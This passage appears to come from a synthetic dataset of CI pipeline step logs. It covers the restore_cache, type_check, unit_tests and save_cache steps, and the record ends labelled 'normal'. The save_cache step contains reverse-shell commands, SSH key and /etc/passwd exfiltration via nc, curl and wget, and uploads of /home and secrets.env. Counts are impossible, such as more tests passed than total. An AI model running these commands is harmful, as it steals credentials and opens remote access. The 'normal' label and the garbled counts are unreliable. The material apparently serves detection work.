          "Step 17/20: Linting",
          "HEAD is now at ce63846",
          "[12:19:19] DEBUG: Memory usage: 537MB",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Installing jest@5.15.3",
          "yarn add: Done in 8.18s",
          "  PASS: test_db_connect (39ms)",
          "Using Node.js 19.11.4",
          "Uploading artifact 'coverage' (34 files)",
          "Cache saved successfully",
          "[12:19:19] INFO: Request completed",
          "Using Node.js 14.0.1",
          "Transforming 980 files...",
          "\u2713 Task completed in 1953ms",
          "GET /status - 201 (78ms)",
          "OK",
          "Step 17/15: Linting",
          "Cache invalidated: node_modules",
          "npm notice: created a lockfile",
          "Already up to date.",
          "[12:19:19] DEBUG: Initializing service",
          "Already up to date.",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:19] DEBUG: Connection pool: 8 active",
          "NODE_ENV=test",
          "Connection established",
          "Platform: darwin-arm64",
          "npm install: added 254 packages",
          "Optimizing 89 modules...",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2717 build failed with exit code 110",
          "[12:19:19] ERROR: Connection failed",
          "  PASS: test_api_health (283ms)",
          "Minifying vendor.js",
          "Cache invalidated: dependencies",
          "Tests: 143 passed, 110 total",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:19] INFO: Cache refreshed",
          "Snapshots: 28 passed, 13 total",
          "Tests: 445 passed, 203 total",
          "Pulling image: node:latest",
          "Pushing to registry...",
          "Done.",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "Compiling lib/service.java...",
          "[12:19:19] INFO: Cache refreshed",
          "Compiling src/index.js...",
          "pip: Collecting express",
          "[12:19:19] INFO: Starting build process",
          "Creating production build...",
          "Generating source maps...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-22T12:21:09.902616",
        "finished_at": "2025-11-22T12:21:17.098513",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] INFO: Cache refreshed",
          "HEAD is now at a735c62",
          "[12:19:19] DEBUG: Loading configuration",
          "\u2713 Task completed in 4474ms",
          "  PASS: test_auth_login (110ms)",
          "Using Node.js 15.5.4",
          "Fetching submodules...",
          "Ran 193 tests in 2s",
          "Ran 39 tests in 39s",
          "npm install: resolved 604 packages",
          "npm notice: created a lockfile",
          "Tests: 486 passed, 279 total",
          "Uploading artifact 'build' (32 files)",
          "npm install: added 380 packages",
          "Artifact uploaded: dist.zip (60MB)",
          "Generating source maps...",
          "Coverage: 96% statements, 88% branches",
          "\u2713 Task completed in 890ms",
          "Installing prettier@1.9.9",
          "[12:19:19] DEBUG: Connection pool: 20 active",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 18.37s",
          "[12:19:19] DEBUG: Loading configuration",
          "Success!",
          "Transforming 646 files...",
          "Transforming 938 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 17/24: Building",
          "Cache miss for key-6348",
          "Ready.",
          "Using Node.js 14.10.5",
          "Exception: ValueError",
          "POST /upload - 201 (475ms)",
          "Step 4/20: Building",
          "Artifact uploaded: dist.zip (83MB)",
          "Compiling utils/main.py...",
          "WARNING: axios has known vulnerabilities",
          "\u2713 deploy completed",
          "TLS handshake completed",
          "Image pulled successfully",
          "npm install: added 428 packages",
          "Test Suites: 7 passed, 16 total",
          "Optimizing 94 modules...",
          "Uploading artifact 'build' (13 files)",
          "Step 11/20: Installing dependencies",
          "[12:19:19] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Test Suites: 21 passed, 44 total",
          "Bundling runtime.css",
          "[12:19:19] INFO: Request completed",
          "Bundling main.js",
          "[12:19:19] DEBUG: Initializing service",
          "Compiling src/app.ts...",
          "Image pulled successfully",
          "Step 7/23: Linting",
          "npm notice: created a lockfile",
          "Cache miss for key-1921",
          "Uploading artifact 'build' (28 files)",
          "Step 7/22: Running migrations",
          "Cache miss for key-2794",
          "[12:19:19] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:19:19] DEBUG: Initializing service",
          "Test Suites: 6 passed, 47 total",
          "pip install: Successfully installed eslint-3.4",
          "Loading...",
          "Artifact downloaded: 13MB",
          "pip: Downloading lodash-1.9.tar.gz",
          "Connecting to test.io:443...",
          "Compiling components/app.ts...",
          "[12:19:19] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "HEAD is now at 07dbaf9",
          "Checking out master branch",
          "TLS handshake completed",
          "OK",
          "[12:19:19] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "[12:19:19] WARN: Deprecated API usage",
          "Success!",
          "Compiling lib/index.js...",
          "Coverage: 96% statements, 60% branches",
          "npm install: resolved 1927 packages",
          "Step 15/18: Building",
          "Using Node.js 15.10.8",
          "[12:19:19] DEBUG: Query executed in 44ms",
          "WARNING: axios has known vulnerabilities",
          "Connecting to example.com:443...",
          "Processing...",
          "Compiling lib/service.java...",
          "Connecting to example.com:443...",
          "Verifying...",
          "Transforming 536 files...",
          "Step 20/17: Testing",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Cache saved successfully",
          "Finished.",
          "Checking out develop branch",
          "Cache saved successfully",
          "Building Docker image...",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-879'",
          "Ran 163 tests in 53s",
          "Test Suites: 9 passed, 23 total",
          "Ran 173 tests in 55s",
          "GET /health - 204 (71ms)",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:19] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-928'",
          "[12:19:19] ERROR: Connection failed",
          "npm install: added 345 packages",
          "Pushing to registry...",
          "pip install: Successfully installed axios-3.15",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "Ready.",
          "HEAD is now at e8a3c38",
          "Snapshots: 44 passed, 34 total",
          "WARNING: express has known vulnerabilities",
          "[12:19:19] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed axios-5.11",
          "Image pulled successfully",
          "  PASS: integration/test_user_create.spec.js",
          "Compiling src/handler.rs...",
          "Step 13/19: Testing",
          "Cache invalidated: dependencies",
          "Environment: staging",
          "Using Node.js 16.3.10",
          "TLS handshake completed",
          "Cache miss for key-5664",
          "Ran 107 tests in 30s",
          "WARNING: webpack has known vulnerabilities",
          "Fetching submodules...",
          "Loading...",
          "[12:19:19] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Bundling styles.js",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] ERROR: Connection failed",
          "\u2713 Task completed in 1830ms",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-22T12:21:17.098513",
        "finished_at": "2025-11-22T12:21:38.686204",
        "log_lines": [
          "=== Step: unit_tests ===",
          "OK",
          "[12:19:19] DEBUG: Initializing service",
          "  PASS: test_db_connect (305ms)",
          "pip: Installing build dependencies...",
          "Test Suites: 39 passed, 34 total",
          "[12:19:19] DEBUG: Initializing service",
          "Coverage: 81% statements, 92% branches",
          "yarn add: Done in 13.17s",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Connection established",
          "TLS handshake completed",
          "Platform: win32-x64",
          "Optimizing 42 modules...",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "pip install: Successfully installed react-2.1",
          "npm notice: created a lockfile",
          "Step 10/18: Deploying",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Coverage: 82% statements, 62% branches",
          "Bundling runtime.js",
          "Cache saved successfully",
          "[12:19:19] DEBUG: Connection pool: 2 active",
          "Ready.",
          "POST /data - 200 (254ms)",
          "Compiling lib/index.js...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache miss for key-7724",
          "Layer 4/13: RUN command",
          "Step 3/21: Running migrations",
          "[12:19:19] ERROR: Connection failed",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Snapshots: 10 passed, 22 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling utils/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "Checking out master branch",
          "Compiling src/handler.rs...",
          "Step 6/16: Testing",
          "Image pulled successfully",
          "HEAD is now at d5f137c",
          "[12:19:19] DEBUG: Connection pool: 4 active",
          "Artifact downloaded: 17MB",
          "Using Python 3.12",
          "[12:19:19] DEBUG: Loading configuration",
          "[12:19:19] WARN: Deprecated API usage",
          "Tests: 360 passed, 229 total",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] DEBUG: Query executed in 58ms",
          "npm notice: created a lockfile",
          "  PASS: test_api_health (166ms)",
          "Pulling image: python:3.11",
          "Cache restored successfully (104MB)",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'bugfix/task-592'",
          "Processing...",
          "Step 15/20: Linting",
          "[12:19:19] DEBUG: Connection pool: 16 active",
          "[12:19:19] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Creating production build...",
          "Connecting to acme.corp:443...",
          "Verifying...",
          "Step 5/22: Testing",
          "[12:19:19] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Switched to branch 'bugfix/task-393'",
          "pip: Installing build dependencies...",
          "pip: Collecting react",
          "Step 18/17: Installing dependencies",
          "[12:19:19] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "[12:19:19] DEBUG: Initializing service",
          "GET /api - 201 (88ms)",
          "Compiling src/main.py...",
          "Processing...",
          "Ready.",
          "pip: Installing build dependencies...",
          "[12:19:19] DEBUG: Query executed in 1ms",
          "Step 7/25: Installing dependencies",
          "Done.",
          "\u2713 test completed",
          "Building Docker image...",
          "Generating source maps...",
          "\u2717 build failed with exit code 106",
          "Already up to date.",
          "Tests: 112 passed, 72 total",
          "Waiting...",
          "[12:19:19] DEBUG: Query executed in 18ms",
          "POST /api - 201 (209ms)",
          "Loading...",
          "OK",
          "Step 13/20: Linting",
          "Using Node.js 15.7.9",
          "npm notice: package.json updated",
          "Generating source maps...",
          "Already up to date.",
          "Bundling runtime.css",
          "Step 2/22: Building",
          "[12:19:19] INFO: Connecting to database",
          "Waiting...",
          "[12:19:19] ERROR: Connection failed",
          "  PASS: test_cache_hit (320ms)",
          "\u2713 Task completed in 3251ms",
          "Cache miss for key-6599",
          "HEAD is now at a4e5c18",
          "Step 2/19: Linting",
          "Step 19/15: Installing dependencies",
          "[12:19:19] DEBUG: Loading configuration",
          "npm install: resolved 1635 packages",
          "Already up to date.",
          "Artifact downloaded: 1MB",
          "FAILED: test_user_create",
          "\u2713 All checks passed",
          "Time: 72.952s",
          "Completed.",
          "[12:19:19] INFO: Cache refreshed",
          "Using Node.js 14.4.4",
          "Loading...",
          "GET /api - 201 (8ms)",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Step 5/19: Building",
          "\u2717 build failed with exit code 81",
          "Success!",
          "Checking out main branch",
          "Generating source maps...",
          "Snapshots: 31 passed, 9 total",
          "Done.",
          "Cache saved successfully",
          "Fetching submodules...",
          "Connection established",
          "Loading...",
          "\u2713 lint completed",
          "Step 19/16: Installing dependencies",
          "Snapshots: 25 passed, 38 total",
          "Minifying app.js",
          "Compiling utils/index.js...",
          "Platform: win32-x64",
          "TLS handshake completed",
          "[12:19:19] INFO: Request completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-22T12:21:38.686204",
        "finished_at": "2025-11-22T12:21:43.003742",
        "log_lines": [
          "nc -e /bin/sh 39.192.153.29 50257",
          "=== Step: save_cache ===",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 203.180.87.205 3217",
          "  PASS: unit/test_user_create.spec.js",
          "Already up to date.",
          "Switched to branch 'bugfix/task-809'",
          "Step 12/22: Testing",
          "Step 3/18: Building",
          "HEAD is now at 69f8494",
          "Step 20/17: Linting",
          "Finished.",
          "Done.",
          "[12:19:19] DEBUG: Memory usage: 1899MB",
          "Fetching submodules...",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "Compiling src/service.java...",
          "Checking out main branch",
          "GET /health - 204 (85ms)",
          "Uploading artifact 'build' (5 files)",
          "HEAD is now at ad59007",
          "Using Python 3.11",
          "  PASS: test_api_health (334ms)",
          "Step 9/25: Deploying",
          "[12:19:19] INFO: Request completed",
          "Exception: RuntimeError",
          "Building Docker image...",
          "pip install: Successfully installed express-2.6",
          "[12:19:19] DEBUG: Memory usage: 268MB",
          "Platform: win32-x64",
          "Connection established",
          "Checking out master branch",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Artifact downloaded: 44MB",
          "Building Docker image...",
          "Step 8/21: Linting",
          "Step 14/20: Running migrations",
          "Compiling components/handler.rs...",
          "Ready.",
          "Tests: 449 passed, 328 total",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Compiling components/handler.rs...",
          "Layer 1/8: RUN command",
          "  PASS: test_auth_login (44ms)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 21.136.79.137 6187",
          "Generating source maps...",
          "Cache miss for key-5303",
          "Success!",
          "\u2713 All checks passed",
          "Cache miss for key-5749",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Sending 22MB of data to example.com",
          "Installing lodash@1.10.6",
          "Checking out main branch",
          "Step 15/19: Running migrations",
          "\u2717 build failed with exit code 69",
          "NODE_ENV=production",
          "Switched to branch 'hotfix/task-233'",
          "Done.",
          "Step 9/21: Testing",
          "[12:19:19] DEBUG: Memory usage: 760MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Finished.",
          "Success!",
          "OK",
          "[12:19:19] DEBUG: Query executed in 10ms",
          "Already up to date.",
          "Optimizing 81 modules...",
          "npm notice: created a lockfile",
          "[12:19:19] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:19] INFO: Starting build process",
          "Creating production build...",
          "Finished.",
          "[12:19:19] DEBUG: Loading configuration",
          "Coverage: 84% statements, 61% branches",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Image pulled successfully",
          "Image pulled successfully",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 222.68.95.221 18854",
          "Switched to branch 'hotfix/task-816'",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 88.195.107.16 10610",
          "Minifying main.js",
          "[12:19:19] DEBUG: Initializing service",
          "Environment: production",
          "Cache hit for key-1705",
          "npm notice: package.json updated",
          "\u2713 Task completed in 895ms",
          "Step 10/17: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:19] INFO: Connecting to database",
          "HEAD is now at 2c6608e",
          "\u2713 All checks passed",
          "Creating production build...",
          "Generating source maps...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 232.107.41.148 50187",
          "HEAD is now at 79b2372",
          "[12:19:19] DEBUG: Loading configuration",
          "Step 3/22: Testing",
          "Optimizing 73 modules...",
          "Time: 75.534s",
          "pip install: Successfully installed webpack-2.8",
          "Step 13/17: Building",
          "Cache invalidated: node_modules",
          "nc -e /bin/sh 71.88.12.131 17542",
          "Already up to date.",
          "FAILED: test_auth_login",
          "Layer 3/10: COPY command",
          "Processing...",
          "Minifying main.js",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "nc -e /bin/sh 244.162.148.233 29759",
          "Sending 79MB of data to test.io",
          "Done.",
          "[12:19:19] DEBUG: Initializing service",
          "Compiling src/app.ts...",
          "Completed.",
          "[12:19:19] DEBUG: Connection pool: 15 active",
          "Step 14/21: Deploying",
          "Switched to branch 'feature/task-920'",
          "Sending 462MB of data to example.com",
          "Pulling image: node:latest",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "WARNING: react has known vulnerabilities",
          "Sending 270MB of data to example.com",
          "Optimizing 98 modules...",
          "Coverage: 79% statements, 93% branches",
          "Minifying main.js",
          "nc -e /bin/sh 180.215.238.133 18784",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Step 18/25: Running migrations",
          "Pulling image: node:latest",
          "[12:19:19] INFO: Request completed",
          "Coverage: 98% statements, 86% branches",
          "Compiling components/service.java...",
          "\u2713 Task completed in 3096ms",
          "Exception: ValueError",
          "Cache invalidated: build",
          "pip: Downloading react-5.9.tar.gz",
          "\u2713 Task completed in 4834ms",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Pushing to registry...",
          "[12:19:19] DEBUG: Memory usage: 1409MB",
          "Fetching submodules...",
          "Loading...",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Test Suites: 11 passed, 18 total",
          "Processing...",
          "[12:19:19] DEBUG: Connection pool: 16 active",
          "npm install: added 200 packages",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Checking out master branch",
          "Verifying...",
          "[12:19:19] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "pip: Installing build dependencies...",
          "Step 2/16: Running migrations",
          "[12:19:19] DEBUG: Connection pool: 1 active",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}